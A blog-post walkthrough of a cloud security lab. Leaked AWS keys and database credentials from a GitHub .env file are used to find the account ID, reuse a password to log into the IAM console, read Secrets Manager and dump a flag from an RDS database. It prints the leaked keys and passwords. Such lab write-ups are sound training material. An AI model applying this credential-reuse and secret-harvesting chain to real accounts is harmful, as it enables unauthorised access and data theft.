---
layout: post
title:  "Leverage Leaked Credentials For Pwnage"
date:   2024-06-24 21:39:54 +0530
categories: AWS
---

# Initial Entry

As an Initial Entry point we have been provided with the following details 

  

|     |     |
| --- | --- |
| Type | Value |
| Github | [https://github.com/huge-logistics/aws-react-app](https://github.com/huge-logistics/aws-react-app)<br> |

  

The scenario here is ever-shifting world of logistics, Huge Logistics has emerged as an undisputed global leader. Yet, every Goliath has its vulnerabilities. Whispered rumors in cybersecurity circles suggest that amidst the vast digital sprawl of Huge Logistics, there might lie unnoticed weaknesses. As a seasoned security consultant, your mission is set: Navigate the labyrinth of Huge Logistics' GitHub repositories, looking for the smallest chink in their armor. Dive deep, analyze thoroughly, and leave no stone unturned. Can you spot what others have missed?

  

## Solution 

In the following repository, where they have been provided with `.env` file and inspecting that we found two interesting things which will be useful for us one is the AWS access key which is `AKIAWHEOTHRFVXYV44WP`  

  

![]({{ site.baseurl }}/assets/images/lev1.png) 

  

With the aws cli module, we can retrieve the account ID of this access key with the following command `aws sts get-access-key-info --access-key <access key>` 

  

```sh
r4y@DESKTOP-3KBF4H7:/mnt/c/Users/Nithissh/.aws$ aws sts get-access-key-info --access-key-id AKIAWHEOTHRFVXYV44WP --profile nithissh
{
    "Account": "427648302155"
}
```

  

In the same `.env`  file we also have database credentials with username as `jose`  and password as `DevOps0001!` and let’s do one thing like credential stuffing attack on AWS login console.. We know the AWS account ID right so through IAM login, fill up the account ID as `427648302155` later the username and password as `jose` and `DevOps0001!` 

  

![]({{ site.baseurl }}/assets/images/lev2.png) 

  

Once we click on login and suprisingly the method worked out and logged in as a IAM user called `jose` and exploring the console they used `AWS secrets manager` may be they would have used recently 

  

![]({{ site.baseurl }}/assets/images/lev3.png) 
  

There are 4 secrets being stored over there and out of which two are interesting one is [employee-database-admin](https://us-east-1.console.aws.amazon.com/secretsmanager/secret?name=employee-database-admin&region=us-east-1) and [employee-database](https://us-east-1.console.aws.amazon.com/secretsmanager/secret?name=employee-database-admin&region=us-east-1) 

  

Accessing the [`employee-database-admin`](https://us-east-1.console.aws.amazon.com/secretsmanager/secret?name=employee-database-admin&region=us-east-1) is restricted here and particularly for this account

  

![]({{ site.baseurl }}/assets/images/lev4.png) 
  

But we can able to access [`employee-database`](https://us-east-1.console.aws.amazon.com/secretsmanager/secret?name=employee-database-admin&region=us-east-1) and retrieve the secrets like DB name, DB username and password.. Also the hostname 

  

![]({{ site.baseurl }}/assets/images/lev5.png)  

  

With the following details and we connect it through `mysql-client` 

  

```sh
r4y@DESKTOP-3KBF4H7:/mnt/c/Users/Nithissh/.aws$ mysql -u reports -h employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com -
D employees -p
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 496468
Server version: 5.5.5-10.6.10-MariaDB managed by https://aws.amazon.com/rds/

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

  

We can list the tables using `show tables;` query and found that `flag` row exists which is obviously our objective to capture 

  

```sql
mysql> show tables;
+---------------------+
| Tables_in_employees |
+---------------------+
| countries           |
| departments         |
| dependents          |
| employees           |
| flag                |
| jobs                |
| locations           |
| regions             |
+---------------------+
8 rows in set (0.25 sec)
```

  

Now finally, you can the get flag through `SELECT * FROM flag`  and it will dump out our flag

  

```sql
mysql> SELECT * FROM flag;
+----------------------------------+
| flag                             |
+----------------------------------+
| d0e4b22365ad230c53c4ffc269dc0202 |
+----------------------------------+
1 row in set (0.24 sec)
```